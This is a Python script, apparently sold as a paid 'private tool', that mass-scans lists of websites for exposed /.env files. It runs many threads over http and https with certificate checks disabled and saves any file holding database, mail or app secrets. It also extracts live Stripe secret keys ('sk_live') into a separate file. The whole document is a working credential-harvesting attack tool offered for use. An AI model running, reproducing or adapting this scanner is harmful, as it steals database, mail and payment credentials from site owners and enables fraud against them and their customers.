import re
import sys
import os
import time
import socket
import urllib3
import smtplib
import os.path
import requests
from os import path
from concurrent.futures import ThreadPoolExecutor
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class xcol:
    LGREEN = '\033[38;2;129;199;116m'
    LRED = '\033[38;2;239;83;80m'
    RESET = '\u001B[0m'
    LBLUE = '\033[38;2;66;165;245m'
    GREY = '\033[38;2;158;158;158m'

class ScanTracker:
    def __init__(self):
        self.scanned_urls = set()
        self.found_envs = 0
        self.total_urls = 0
        self.processed_urls = 0
        self.load_progress()

    def load_progress(self):
        if os.path.exists('scan_progress.txt'):
            with open('scan_progress.txt', 'r') as f:
                for line in f:
                    self.scanned_urls.add(line.strip())
    
    def save_progress(self, url):
        with open('scan_progress.txt', 'a') as f:
            f.write(f"{url}\n")
        self.scanned_urls.add(url)
    
    def increment_found(self):
        self.found_envs += 1
    
    def increment_processed(self):
        self.processed_urls += 1
    
    def update_title(self):
        progress = (self.processed_urls / self.total_urls) * 100
        title = f"ENV Scanner | Progress: {progress:.1f}% | Found: {self.found_envs} | Remaining: {self.total_urls - self.processed_urls}"
        sys.stdout.write(f"\033]0;{title}\007")
        sys.stdout.flush()

class ENV:
    def __init__(self, tracker):
        self.tracker = tracker
    
    def scan(self, url):
        if url in self.tracker.scanned_urls:
            self.tracker.increment_processed()
            self.tracker.update_title()
            return

        rr = ''
        proto = ''
        mch = ['DB_HOST=', 'MAIL_HOST=', 'MAIL_USERNAME=','sk_live', 'APP_ENV=']
        
        try:
            r = requests.get(f'http://{url}/.env', verify=False, timeout=10, allow_redirects=False)
            if r.status_code == 200:
                resp = r.text
                if any(key in resp for key in mch):
                    rr = f'{xcol.LGREEN}[ENV]{xcol.RESET} : http://{url}'
                    with open(os.path.join('ENVS', f'{url}_env.txt'), 'w') as output:
                        output.write(f'{resp}\n')
                    if "sk_live" in resp:
                        with open('SK_ENV.TXT', 'a') as file_object:
                            file_object.write(f'ENV : {url}\n')
                        lin = resp.splitlines()
                        for x in lin:
                            if "sk_live" in x:
                                with open('SK_LIVE.TXT', 'a') as file_object:
                                    file_object.write(re.sub(".*sk_live","sk_live",x)+'\n')
                    self.tracker.increment_found()
                else:
                    rr = 'RE'
            else:
                rr = 'RE'
        except:
            rr = 'RE'
        
        if 'RE' in rr:
            try:
                proto = 'https'
                r = requests.get(f'https://{url}/.env', verify=False, timeout=10, allow_redirects=False)
                if r.status_code == 200:
                    resp = r.text
                    if any(key in resp for key in mch):
                        rr = f'{xcol.LGREEN}[ENV]{xcol.RESET} : https://{url}'
                        with open(os.path.join('ENVS', f'{url}_env.txt'), 'w') as output:
                            output.write(f'{resp}\n')
                        if "sk_live" in resp:
                            with open('SK_ENV.TXT', 'a') as file_object:
                                file_object.write(f'ENV : {url}\n')
                            lin = resp.splitlines()
                            for x in lin:
                                if "sk_live" in x:
                                    with open('SK_LIVE.TXT', 'a') as file_object:
                                        file_object.write(re.sub(".*sk_live","sk_live",x)+'\n')
                        self.tracker.increment_found()
                    else:
                        rr = f'{xcol.LRED}[-] :{xcol.RESET} https://{url}'
                else:
                    rr = f'{xcol.LRED}[-] :{xcol.RESET} https://{url}'
            except:
                rr = f'{xcol.LRED}[*] :{xcol.RESET} https://{url}'
        
        self.tracker.save_progress(url)
        self.tracker.increment_processed()
        self.tracker.update_title()
        print(rr+'/.env')

if __name__ == '__main__':
    os.system('clear')
    print(""" \033[38;2;158;158;158m

    ░███ █░░█    ███ █░░░█ █░░░█  
   █░░░ █░█░    █░░ ██░░█ █░░░█  
   ░██░ ██░░    ███ █░█░█ ░█░█░  
   ░░░█ █░█░    █░░ █░░██ ░███░  
   ███░ █░░█    ███ █░░░█ ░░█░░  
 
: PRVT8 TOOL BY RESS : PAID ONLY
  \u001B[0m""")

    if not os.path.isdir("ENVS"):
        os.makedirs("ENVS")
    
    tracker = ScanTracker()
    
    while True:
        try:
            thrd = int(input(xcol.GREY+"[THREAD] : "+xcol.RESET))
            break
        except:
            pass
    
    while True:
        try:
            inpFile = input(xcol.GREY+"[URLS PATH] : "+xcol.RESET)
            with open(inpFile) as urlList:
                argFile = [url.strip() for url in urlList.read().splitlines() if url.strip() not in tracker.scanned_urls]
            tracker.total_urls = len(argFile)
            break
        except:
            pass
    
    with ThreadPoolExecutor(max_workers=thrd) as executor:
        for data in argFile:
            executor.submit(ENV(tracker).scan, data)
    
    print(f"\n{xcol.LGREEN}[+] Scan completed! Found {tracker.found_envs} .env files.{xcol.RESET}")
    quit()